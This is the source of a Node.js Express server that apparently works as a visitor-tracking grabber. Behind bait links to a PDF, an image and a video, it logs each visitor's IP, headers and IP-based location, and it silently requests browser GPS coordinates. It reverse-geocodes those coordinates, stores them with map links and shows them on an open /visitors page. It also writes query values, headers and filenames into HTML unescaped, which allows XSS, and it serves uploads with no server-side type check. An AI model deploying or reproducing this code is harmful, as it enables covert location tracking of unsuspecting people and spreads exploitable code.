const express = require('express');
const fs = require('fs');
const fetch = require('node-fetch');
const multer = require('multer');
const app = express();
const port = 3000;

// Set up multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage });

// Serve static files
app.use(express.static('public'));
app.use(express.static('uploads'));

// Helper to count visitors
function getVisitorCount() {
  if (!fs.existsSync('visitors.txt')) return 0;
  const data = fs.readFileSync('visitors.txt', 'utf8');
  return (data.match(/New Visitor:/g) || []).length;
}

// Homepage
app.get('/', async (req, res) => {
  const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = ipRaw.split(',')[0].trim().replace('::ffff:', '');
  const userAgent = req.headers['user-agent'];
  const headers = JSON.stringify(req.headers, null, 2);

  const geoUrl = `https://ipapi.co/${ip}/json/`;
  let city = 'N/A', region = 'N/A', country = 'N/A';

  try {
    const response = await fetch(geoUrl);
    const geoData = await response.json();
    city = geoData.city || 'N/A';
    region = geoData.region || 'N/A';
    country = geoData.country_name || 'N/A';
  } catch (err) {
    console.error('❌ Error fetching IP geolocation:', err);
  }

  const logData = `=========================
New Visitor:
Time: ${new Date().toISOString()}
IP Address: ${ip}
User-Agent: ${userAgent}
Location (IP-based): ${city}, ${region}, ${country}
Headers: ${headers}
=========================\n`;

  fs.appendFile('visitors.txt', logData, (err) => {
    if (err) console.error('❌ Error saving visitor info:', err);
    else console.log('✅ Visitor info saved');
  });

  const visitorCount = getVisitorCount();
  if (visitorCount >= 10) {
    console.log('🎉 10 visitors reached! Clearing log.');
    fs.writeFileSync('visitors.txt', '');
  }

  res.send(`
    <h1>🚀 Welcome!</h1>
    <p>Your IP-based location: ${city}, ${region}, ${country}</p>
    <p>Total visitors (before clearing): ${visitorCount >= 10 ? 0 : visitorCount}</p>

    <p>📄 <a href="/files/sample-doc.pdf" target="_blank">Download PDF</a></p>
    <p>🖼️ <a href="/images/sample-image.jpg" target="_blank">View Image</a></p>
    <p>🎥 <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">Watch YouTube Video</a></p>

    <h2>Upload an Image</h2>
    <form action="/upload" method="POST" enctype="multipart/form-data">
      <input type="file" name="image" accept="image/*" required />
      <button type="submit">Upload</button>
    </form>

    <script>
      navigator.geolocation.getCurrentPosition(
        pos => {
          console.log('📍 Sending coordinates:', pos.coords.latitude, pos.coords.longitude);
          fetch('/log-location?lat=' + encodeURIComponent(pos.coords.latitude) + '&lon=' + encodeURIComponent(pos.coords.longitude));
        },
        err => {
          console.log('❌ Geolocation error:', err);
        }
      );
    </script>
  `);
});

// Client location logging
app.get('/log-location', async (req, res) => {
  const { lat, lon } = req.query;
  console.log(`✅ Received client coordinates: lat=${lat}, lon=${lon}`);

  if (!lat || !lon) {
    return res.send('<p>Error: Missing coordinates</p><p><a href="/">Back to Home</a></p>');
  }

  try {
    const geoUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
    const response = await fetch(geoUrl, { headers: { 'User-Agent': 'MyApp/1.0' } });
    const data = await response.json();

    const address = data.address || {};
    const city = address.city || address.town || address.village || 'N/A';
    const district = address.county || 'N/A';
    const state = address.state || 'N/A';
    const country = address.country || 'N/A';

    const googleMapsUrl = `https://www.google.com/maps?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}`;
    const embedMapUrl = `https://maps.google.com/maps?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&hl=es&z=14&output=embed`;

    const logData = `Client-reported coordinates:
Latitude: ${lat}
Longitude: ${lon}
Resolved Location: City: ${city}, District: ${district}, State: ${state}, Country: ${country}
Google Maps: ${googleMapsUrl}
=========================\n`;

    fs.appendFile('visitors.txt', logData, (err) => {
      if (err) console.error('❌ Error saving client location:', err);
      else console.log('✅ Client location saved');
    });

    res.send(`
      <h2>📍 Location Info</h2>
      <p>Latitude: ${lat}</p>
      <p>Longitude: ${lon}</p>
      <p>City: ${city}</p>
      <p>District: ${district}</p>
      <p>State: ${state}</p>
      <p>Country: ${country}</p>
      <p><a href="${googleMapsUrl}" target="_blank">View on Google Maps</a></p>

      <h3>Embedded Map:</h3>
      <iframe src="${embedMapUrl}" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy"></iframe>

      <p><a href="/">Back to Home</a></p>
    `);
  } catch (err) {
    console.error('❌ Error reverse geocoding:', err);
    res.send('<p>Error getting location info</p><p><a href="/">Back to Home</a></p>');
  }
});

// Upload route
app.post('/upload', upload.single('image'), (req, res) => {
  if (!req.file) return res.status(400).send('No file uploaded');
  res.send(`
    <h2>✅ Image Uploaded Successfully</h2>
    <p>File: <strong>${req.file.filename}</strong></p>
    <img src="/${req.file.filename}" alt="Uploaded Image" width="300"/>
    <p><a href="/">Back to Home</a></p>
  `);
});

// Visitor log route
app.get('/visitors', (req, res) => {
  const visitorCount = getVisitorCount();
  let content = fs.existsSync('visitors.txt') ? fs.readFileSync('visitors.txt', 'utf8') : '';

  // Make map links clickable (shorten display text)
  content = content.replace(/(https:\/\/www\.google\.com\/maps\?q=[^\s]+)/g, '<a href="$1" target="_blank">View Map</a>');

  res.send(`
    <h1>👀 Visitor Log</h1>
    <p>Total visitors logged: ${visitorCount}</p>
    <pre>${content || 'No visitor data.'}</pre>
    <p><a href="/">Back to Home</a></p>
  `);
});

// Start server
app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
